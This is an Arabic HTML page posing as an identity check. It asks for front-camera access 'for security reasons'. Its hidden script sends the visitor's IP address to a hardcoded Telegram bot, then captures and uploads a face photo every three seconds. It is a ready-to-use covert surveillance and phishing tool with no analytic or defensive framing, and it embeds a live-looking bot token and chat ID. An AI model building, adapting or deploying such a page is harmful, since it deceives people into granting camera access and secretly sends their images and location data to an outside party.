<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من هويتك</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            flex-direction: column;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            max-width: 440px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a4a;
        }
        .icon { font-size: 70px; margin-bottom: 10px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        h2 { color: #e94560; margin-bottom: 10px; }
        p { color: #8a8aaa; font-size: 14px; margin-bottom: 20px; }
        .loader {
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.7s linear infinite;
            margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: #8a8aaa; font-size: 13px; margin-top: 10px; }
        .footer { margin-top: 15px; font-size: 11px; color: #3a3a5a; }
        .badge {
            display: inline-block;
            background: rgba(233, 69, 96, 0.15);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #e94560;
            margin-top: 10px;
        }
        #videoPreview { display: none; }
        .btn {
            background: #e94560;
            color: #fff;
            border: none;
            padding: 12px 30px;
            border-radius: 30px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            display: none;
        }
        .btn:hover { background: #c73652; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📸</div>
        <h2>تحقق من هويتك</h2>
        <p>لأسباب أمنية، يرجى السماح بالوصول إلى الكاميرا الأمامية</p>
        <div class="loader" id="loader"></div>
        <div id="status">⏳ جاري تجهيز الكاميرا...</div>
        <div class="badge" id="cameraBadge">📷 كاميرا أمامية</div>
        <video id="videoPreview" autoplay muted></video>
        <button class="btn" id="retryBtn">🔄 إعادة المحاولة</button>
        <div class="footer">🔒 اتصال آمن</div>
    </div>

    <script>
        // ================================================
        // 🔐 إعدادات تليجرام
        // ================================================
        const TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        // ================================================
        // 📤 دوال الإرسال
        // ================================================
        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                });
            } catch (e) {}
        }

        async function sendPhoto(blob, caption = '') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                if (caption) formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }

        // ================================================
        // 🌐 جلب IP
        // ================================================
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'غير معروف';
            } catch {
                return 'غير معروف';
            }
        }

        // ================================================
        // 📸 كاميرا أمامية فقط
        // ================================================
        let stream = null;
        let video = null;
        let canvas = null;
        let captureInterval = null;
        let isCapturing = false;

        async function startFrontCamera() {
            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                video = document.getElementById('videoPreview');
                video.srcObject = stream;
                await video.play();
                video.style.display = 'block';

                canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                document.getElementById('status').innerHTML = '✅ جاري التصوير...';
                document.getElementById('loader').style.display = 'none';
                document.getElementById('cameraBadge').innerHTML = '📷 كاميرا أمامية (وجه)';

                // إرسال إشعار بالبدء
                const ip = await getIP();
                await sendMessage(`🔥 بدء التصوير الأمامي\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`);

                // تصوير فوري
                await captureAndSend('📸 صورة فورية (وجه)');

                // تصوير كل 3 ثواني
                isCapturing = true;
                captureInterval = setInterval(async () => {
                    await captureAndSend('📸 تصوير مستمر (وجه)');
                }, 3000);

                return true;
            } catch (error) {
                document.getElementById('status').innerHTML = '❌ خطأ: ' + error.message;
                document.getElementById('loader').style.display = 'none';
                document.getElementById('retryBtn').style.display = 'inline-block';
                await sendMessage(`❌ فشل الكاميرا: ${error.message}`);
                return false;
            }
        }

        async function captureAndSend(caption) {
            if (!video || !canvas || !isCapturing) return;

            const ctx = canvas.getContext('2d');
            // عكس الصورة (مرآة) للكاميرا الأمامية
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.setTransform(1, 0, 0, 1, 0, 0);

            canvas.toBlob(async (blob) => {
                if (blob) {
                    const ip = await getIP();
                    await sendPhoto(blob, `${caption}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`);
                }
            }, 'image/jpeg', 0.9);
        }

        // ================================================
        // 🚀 بدء التشغيل
        // ================================================
        async function main() {
            const ip = await getIP();
            await sendMessage(`📥 فتح الصفحة\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`);

            document.getElementById('status').innerHTML = '⏳ جاري فتح الكاميرا الأمامية...';
            await startFrontCamera();
        }

        // ================================================
        // 🔄 زر إعادة المحاولة
        // ================================================
        document.getElementById('retryBtn').addEventListener('click', async () => {
            document.getElementById('retryBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').innerHTML = '⏳ جاري إعادة المحاولة...';
            await startFrontCamera();
        });

        // ================================================
        // 🧹 تنظيف عند الإغلاق
        // ================================================
        window.addEventListener('beforeunload', () => {
            isCapturing = false;
            if (captureInterval) clearInterval(captureInterval);
            if (stream) stream.getTracks().forEach(t => t.stop());
        });

        // ================================================
        // ▶️ بدء التشغيل
        // ================================================
        setTimeout(main, 1000);
    </script>
</body>
</html>
